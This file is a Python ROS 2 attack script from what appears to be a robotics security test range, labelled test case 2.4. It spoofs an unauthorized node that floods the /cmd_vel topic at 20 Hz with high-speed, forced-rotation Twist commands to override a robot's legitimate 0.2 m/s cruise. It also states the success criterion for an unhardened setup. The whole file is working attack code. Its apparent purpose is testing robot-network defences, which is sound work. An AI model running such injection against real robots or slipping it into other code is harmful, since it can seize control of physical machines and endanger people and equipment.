#!/usr/bin/env python3
"""
測試案例 2.4：控制指令注入

目的：驗證未授權參與者能否注入惡意 /cmd_vel 覆寫合法巡航指令。
預期結果（未加固）：靶場致動器執行攻擊者的高速/旋轉指令。
成功判定：victim talker_listener 日誌出現非 0.20 的 linear.x（如 5.0）。

用法（attacker 容器內）：
    source /opt/ros/jazzy/setup.bash
    python3 /work/attacks/inject_cmd.py
"""
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist


class Injector(Node):
    def __init__(self):
        super().__init__('cmd_injector')
        self.pub = self.create_publisher(Twist, '/cmd_vel', 10)
        # 高頻注入，壓過 1Hz 的合法指令
        self.timer = self.create_timer(0.05, self.attack)
        self.n = 0
        self.get_logger().error('[ATTACK 2.4] 開始注入惡意 /cmd_vel（高速失控指令）')

    def attack(self):
        cmd = Twist()
        cmd.linear.x = 5.0     # 遠超合法巡航 0.2
        cmd.angular.z = 3.0    # 強制旋轉
        self.pub.publish(cmd)
        self.n += 1
        if self.n % 20 == 0:
            self.get_logger().error(f'已注入 {self.n} 筆惡意指令')
        if self.n >= 200:
            raise SystemExit


def main():
    rclpy.init()
    node = Injector()
    try:
        rclpy.spin(node)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
